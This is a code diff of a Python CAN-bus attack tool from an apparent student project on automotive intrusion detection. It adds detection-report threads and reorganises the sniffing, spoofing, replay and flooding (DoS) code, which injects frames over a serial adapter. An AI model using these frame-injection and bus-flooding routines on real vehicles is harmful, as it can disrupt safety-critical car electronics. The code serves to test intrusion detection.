@@ -3,9 +3,9 @@
     This tool is part of Automotive IDPS and Cyber Security Vulnerability tool Graduation Project
 Usage:
     app.py sniff [--port=COM6] [--baudrate=115200] [-d] [--conf=path] [--out] [(--BL case <case_name> )]
-    app.py spoof [( <target_ecu_name> <msg_id> <signal_name> <new_val> <msg_rate> )][--port=COM6] [--baudrate=115200] [-d] [--conf=path]
-    app.py replay <target_id> [ --new <new_val>] [--port=COM6] [--baudrate=115200] [-d]
-    app.py dos [--port=COM6] [--baudrate=115200] [-d] [(--BL case <case_name> )]
+    app.py spoof [( <target_ecu_name> <msg_id> <signal_name> <new_val> <msg_rate> )][--port=COM6] [--baudrate=115200] [-d] [--conf=path] [(--DR <AlgorithmName>)]
+    app.py replay <target_id> [ --new <new_val>] [--port=COM6] [--baudrate=115200] [-d] [(--DR <AlgorithmName>)]
+    app.py dos [--port=COM6] [--baudrate=115200] [-d] [(--BL case <case_name> )] [(--DR <AlgorithmName>)]
     app.py report (-v case <case_name> )|
 Options:
     --port=COM6         Select the port we connected our UCAN on default is COM6
@@ -14,6 +14,7 @@ Options:
     --conf=path         Path of the xml config file default is conf.xml file name in same directory of the script
     --out               output the log of the sniffing to log.txt file
     --BL                calculate the busload and insert it into external file
+    --DR                Detection Report for certain Detection Algorithm under test
     -v                 visualise the outputs
     --new              flag indicate the desire to send a new value in replay
 '''
@@ -55,7 +56,7 @@ MSG_COUNTER = 0
 MSG_LATEST_COUNT=0 #used in bus load
 MSG_TEMP=0 #used in bus load function
 RATE=0 #used in bus load function
-CASENAME =""
+CASENAME ="busLoad.txt"
 NO_AUTH=False
 MSGS_QUEUE = []
 mutex = Lock()
@@ -108,7 +109,7 @@ def generate_engine_petrol(val): ##val is an hex number
 
 def generate_lamb_onOff(val): ##val is an hex number
     global Lamb_ONOFF
-    Lamb_ONOFF.frame_id = int('0x62',16)
+    Lamb_ONOFF.frame_id = int('0x50',16)
     Lamb_ONOFF.isExtended = 0 # bool
     Lamb_ONOFF.frame_dlc=1 #integer
     Lamb_ONOFF.data=str(val) #long
@@ -121,6 +122,83 @@ def generate_door_onOff(left,right): ##val is an hex number
     Door_ONOFF.frame_dlc=8 #integer
     Door_ONOFF.data=str(left)+str(right) #long
     Door_ONOFF.RTR=0#bool
+
+
+class packageMsgForDOS(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+
+    def run(self):
+        while True:
+            msg = CAN_MSG
+            #start sending msgs of id =0 over the bus with max rate
+            msg.frame_id=0
+            msg.frame_dlc=8
+            msg.data='ffffffffffffffff'
+            global MSGS_QUEUE
+            b=UCAN.UCAN_encode_message(msg)
+            MSGS_QUEUE.append(b)
+
+class dos(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+
+    def run(self):
+        while True:
+            global MSGS_QUEUE,MSG_COUNTER
+            if len(MSGS_QUEUE) != 0:
+                b = MSGS_QUEUE.pop()
+                MSG_COUNTER+=1
+                ser.write(b)
+
+
+class detected(Thread):
+    '''
+    This class thread will be used to generate a report incase of the attacks was detected by an IDS or not
+    the attack is detected if it recieve an id of 0x01 and dlc of 1 and data of 0 ,
+    '''
+    def __init__(self,attack_name,algo_name):
+        Thread.__init__(self)
+        self.algo_name = algo_name
+        self.attack_name = attack_name
+
+    def run(self):
+        #run bus load
+        global CASENAME
+        CASENAME = str(self.attack_name)+"_ON_"+str(self.algo_name)+".txt"
+        thread = calc_BusLoad()
+        thread.start()
+        threads.append(thread)
+
+        msg=CAN_MSG
+        msg.frame_id=1
+        time.sleep(10)
+        if idExists(msg) :
+            found = True
+            print "Attack detected !!"
+            log="===============Attack Failure Report=====================\n"
+            log+="Attack Time:"+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+"\n"
+            log+="========\n"
+            log+= str(self.attack_name)+" Attack has been Detected by :"+str(self.algo_name)+" \n"
+            log+="========\n"
+            log+="Bus Load report is named :"+str(CASENAME)+"\n"
+            log+="========\n"
+            log+="To view Bus load Graphs please enter the following command \n"
+            log+="python app.py report -v case"+str(CASENAME)+"\n"
+            sendToLog(log,'Attack_Report.txt')
+        else:
+            log="===============Attack Success Report=====================\n"
+            log+="Attack Time:"+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+"\n"
+            log+="========\n"
+            log+= str(self.attack_name)+" Attack is applied but Can't be Detected by :"+str(self.algo_name)+" \n"
+            log+="========\n"
+            log+="Bus Load report is named :"+str(LOG)+"\n"
+            log+="========\n"
+            log+="To view Bus load Graphs please enter the following command \n"
+            log+="python app.py report -v case Attack_Report.txt "
+            sendToLog(log,'Attack_Report.txt')
+
+
 
 ## Bus load calculations
 ##sequential bus load calc
@@ -149,7 +227,6 @@ class calc_BusLoad(Thread):
             MSG_TEMP=MSG_COUNTER-MSG_LATEST_COUNT
             MSG_LATEST_COUNT=MSG_COUNTER
             RATE=(float(MSG_TEMP)/3906.0)*100.0
-            print('calc bus load hh')
             file=open(str(CASENAME),"a+")
             file.write(str(RATE)+"\n")
             file.close()
@@ -212,12 +289,11 @@ class spoofing(Thread):
             global MSG_COUNTER
             MSG_COUNTER +=1
             # try:
-            b= UCAN.UCAN_encode_message(msg)
             ser.write(UCAN.UCAN_encode_message(msg))
-            # print "Msg sent successfully"
+            print "CAN Frame injected successfully"
             mutex.release()
             # except Exception :
-            #     print("can't perform Spoof Attack !!"),BaseException.message
+            #     print("can't perform inject the CAN Frame !!"),BaseException.message
 
 
 class replay(Thread):
@@ -267,19 +343,6 @@ def startAuth():
 
     ser.write(bytearray([12]))
 
-##sequential sniff
-def sniff():
-    ''' start sniffing over the CAN bus  '''
-    # print(chr(27) + "[2J") #clear screen
-    print "++++++++= Start Sniffing CAN Bus =++++++++"
-    while True:
-        #convert from byte to hex string
-        framebuffer=ser.read(13).encode("hex")
-        if DEBUG==True :
-            print "DEBUG-> SERIAL is ",framebuffer
-        # bin(int(framebuffer,16)) #converted into binary
-        msg = canFrameDecodder(framebuffer)
-        printMsg(msg)
 
 def closeConn():
     ''' close the connections and exit system '''
@@ -324,30 +387,34 @@ def getStandardID(frame):
     return fId
 
 def sendToLog(log,fileName):
-    file = open(fileName,'a')
+    file = open(fileName,'a+')
     file.write(log)
     file.close()
 
 def printMsg(msg):
     ''' Print the sniffed msg '''
     global MSG_COUNTER
-    log = str((MSG_COUNTER))+'  @  '+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+("    ||  ID :")+str(msg.frame_id)+"  ||  DLC:"+str(msg.frame_dlc)+"   ||  Data:"+str(msg.data) +'\n'
+    log = str((MSG_COUNTER))+'@'+datetime.datetime.fromtimestamp(time.time()).strftime('%H:%M:%S')+("|ID :")+str(msg.frame_id)+"|DLC:"+str(msg.frame_dlc)+"|Data:"+str(msg.data) +'\n'
     MSG_COUNTER +=1
     if LOG != None:
         sendToLog(log,LOG)
-    if idExists(msg):
-        # print "found"
-        # print log
+    if sameFrameExists(msg):
         pass
-        # print(chr(27) + "[2J") #clear screen
     else:
         sniffed_Msgs.append(msg)
         print log
 
-def idExists(msg):
+def sameFrameExists(msg):
     ''' This function is used to check if the recieved msg has been seen before or not , it is used in the printMsg function '''
     for s in sniffed_Msgs:
         if (s.frame_id == msg.frame_id) and (s.data==msg.data):
+            return True
+    return False
+
+def idExists(msg):
+    ''' This function is used to check if the recieved msg has been seen before or not , it is used in the printMsg function '''
+    for s in sniffed_Msgs:
+        if (s.frame_id == msg.frame_id):
             return True
     return False
 
@@ -379,50 +446,8 @@ def byte_to_binary(n):
 def hex_to_binary(h):
     return ''.join(byte_to_binary(ord(b)) for b in binascii.unhexlify(h))
 
-#sequlential busload
-# def visualise_busLoad():
-#     print( 'visualize bus load entered ')
-#     x = []
-#     with open('dd.txt','r') as csvfile:
-#         plots = csv.reader(csvfile, delimiter=',')
-#         for row in plots:
-#             x.append(int(row[0]))
-#
-#
-#     plt.plot(x, label='Bus Load')
-#     plt.xlabel('x')
-#
-#     plt.title(CASENAME)
-#     plt.legend()
-#     plt.show()
 
 
-class packageMsgForDOS(Thread):
-    def __init__(self):
-        Thread.__init__(self)
-
-    def run(self):
-        while True:
-            msg = CAN_MSG
-            #start sending msgs of id =0 over the bus with max rate
-            msg.frame_id=0
-            msg.frame_dlc=8
-            msg.data='ffffffffffffffff'
-            global MSGS_QUEUE
-            b=UCAN.UCAN_encode_message(msg)
-            MSGS_QUEUE.append(b)
-
-class dos(Thread):
-    def __init__(self):
-        Thread.__init__(self)
-
-    def run(self):
-        while True:
-            global MSGS_QUEUE,MSG_COUNTER
-            if len(MSGS_QUEUE) != 0:
-                b = MSGS_QUEUE.pop()
-                MSG_COUNTER+=1
-                ser.write(b)
 
 
 if __name__ == '__main__':
@@ -450,8 +475,6 @@ if __name__ == '__main__':
             except:
                 print("can't start" ),"visualise_busLoad"
 
-
-    #
     if NO_AUTH == False:
         #handlling coniguration args
         if arguments['--port'] != None : #set the com port
@@ -467,7 +490,6 @@ if __name__ == '__main__':
             print ("Not connected")
             print '====================================================='
             exit(0)
-        print('no auuuuuth')
 
         # start UCAN authentication for Auth needed commands
         startAuth()
@@ -503,6 +525,14 @@ if __name__ == '__main__':
 
         if arguments['--baudrate'] != None: #set baudrate
             BaudRate = int(arguments['--baudrate'])
+
+        if arguments['--DR']==True:
+            #detection report is required
+            if arguments['<AlgorithmName>'] != None:
+                thread = detected('Spoofing',str(arguments['<AlgorithmName>']))
+                thread.start()
+                threads.append(thread)
+
 
         try:
             thread=spoofing(msgArgs['ecu_name'],msgArgs['msg_id'],msgArgs['signal_name'],msgArgs['new_val'],msgArgs['msg_rate'])
@@ -571,6 +601,7 @@ if __name__ == '__main__':
             thread = calc_BusLoad()
             thread.start()
             threads.append(thread)
+
         #start dos
         thread = packageMsgForDOS()
         thread.start()
@@ -578,6 +609,13 @@ if __name__ == '__main__':
         thread = dos()
         thread.start()
         threads.append(thread)
+        if arguments['--DR']==True:
+        #detection report is required
+            if arguments['<AlgorithmName>'] != None:
+                thread = detected('Spoofing',str(arguments['<AlgorithmName>']))
+                thread.start()
+                threads.append(thread)
+
 
 
 
@@ -603,6 +641,12 @@ if __name__ == '__main__':
             thread = replay(target,False,0)
             thread.start()
             threads.append(thread)
+        if arguments['--DR']==True:
+        #detection report is required
+            if arguments['<AlgorithmName>'] != None:
+                thread = detected('Spoofing',str(arguments['<AlgorithmName>']))
+                thread.start()
+                threads.append(thread)
 
     #
     #joining threads
